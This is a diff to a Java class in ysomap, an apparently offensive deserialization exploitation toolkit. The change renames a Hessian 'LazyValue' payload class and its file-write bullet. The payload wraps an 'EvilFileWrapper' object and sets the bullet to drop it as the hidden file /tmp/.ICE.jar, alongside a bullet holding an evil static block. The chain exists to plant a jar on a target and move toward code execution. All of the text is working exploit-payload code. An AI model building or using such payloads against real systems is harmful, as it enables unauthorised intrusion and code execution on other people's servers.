@@ -1,7 +1,7 @@
 package ysomap.payloads.hessian;
 
 import ysomap.bullets.Bullet;
-import ysomap.bullets.jdk.SwingLazyValueWithFileWriteBullet;
+import ysomap.bullets.jdk.LazyValueWithFileWrite1Bullet;
 import ysomap.bullets.objects.ClassWithEvilStaticBlockFromExistClazz;
 import ysomap.common.annotation.*;
 import ysomap.payloads.Payload;
@@ -18,7 +18,7 @@ import ysomap.payloads.java.objects.EvilFileWrapper;
 @Dependencies({"hessian"})
 @Require(bullets = {
         "ClassWithEvilStaticBlockFromExistClazz"}, param = false)
-public class LazyValueForHessianWithFileWrite extends LazyValueForHessian {
+public class LazyValueForHessianWithFileWrite1 extends LazyValueForHessian {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
@@ -34,7 +34,7 @@ public class LazyValueForHessianWithFileWrite extends LazyValueForHessian {
     public Object pack(Object obj) throws Exception {
         Payload wrapper = new EvilFileWrapper();
         wrapper.setBullet(bullet);
-        Bullet bullet = new SwingLazyValueWithFileWriteBullet();
+        Bullet bullet = new LazyValueWithFileWrite1Bullet();
         bullet.set("localFile", "dynamic");
         bullet.set("filepath", "/tmp/.ICE.jar");
         bullet.set("data", wrapper.getObject());
